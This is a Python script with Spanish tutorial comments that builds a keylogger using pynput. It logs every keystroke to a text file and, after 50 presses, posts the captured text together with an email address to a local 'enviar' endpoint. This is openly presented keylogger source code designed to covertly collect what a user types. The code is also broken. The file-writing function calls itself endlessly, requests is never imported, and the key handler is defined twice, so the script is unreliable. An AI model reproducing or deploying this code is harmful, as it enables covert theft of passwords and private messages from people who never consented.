from pynput.keyboard import Key, Listener

# 1. Definimos qué pasa al presionar
def on_press(key):
    print(f'Se presionó la tecla {key}')

# 2. Definimos qué pasa al soltar (Debe estar al mismo nivel que on_press)
def on_release(key):
    if key == Key.esc:
        print("Saliendo del programa...")
        return False # Detiene el Listener

# 3. El bloque principal que "escucha"
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Creamos una lista que almacene todas las pulsaciones
keys = []

# Creamos una variable que nos servirá para controlar el largo de nuestra cadena de texto
count = 0

# Creamos una función que cree un archivo donde queden almacenadas esas pulsaciones
def write_file(keys):
    with open("salida.txt", "a") as file:
        for key in keys:

            # Convertimos key en un string y sustituimos las comillas por nada
            k = str(key).replace("'", "")

            # Si la palabra "space" está dentro de nuestra lista entonces
            # damos un salto de linea
            if "space" in k:
                file.write('\n')

            # Si no encontramos la palabra "Key" en nuestro elemento,
            # lo guardamos en nuestro archivo
            elif k.find("Key") == -1:
                file.write(k)
    write_file(keys)


# Creamos una función que sea capáz de leer el archivo creado
def read_file():
    # Creamos una variable que almacene el mensaje
    mensaje = ''

    # Abrimos el archivo como "file"
    with open("salida.txt", "r") as file:
        # Leemos el contenido del texto y lo guardamos en una lista
        content = file.readlines()

        # Recorremos la lista y por cada palabra encontrada la concatenamos
        # En nuestra variable mensaje
        for palabra in content:
            mensaje += palabra

    # Al final del for, retornamos el mensaje
    return mensaje
count_email = 0


def on_press(key):
    global keys, count, count_email
    keys.append(key)
    print(f'Se presionó la tecla {key}')

    count += 1
    count_email += 1

    if count >= 5:
        count = 0
        write_file(keys)

    # Creamos una condición que sea capaz de ejecutar una acción cada que el usuario
    # tecleé 50 veces
    if count_email >= 50:
        # Creamos un diccionario para enviar la información
        informacion_a_enviar = {
            'correo': 'knockedemdeadkid1313@mail.com',
            'mensaje': read_file()
        }

        # Hacemos una llamada de tipo Post a la API y enviamos la información recolectada
        res = requests.post('http://localhost:4040/enviar', json=informacion_a_enviar)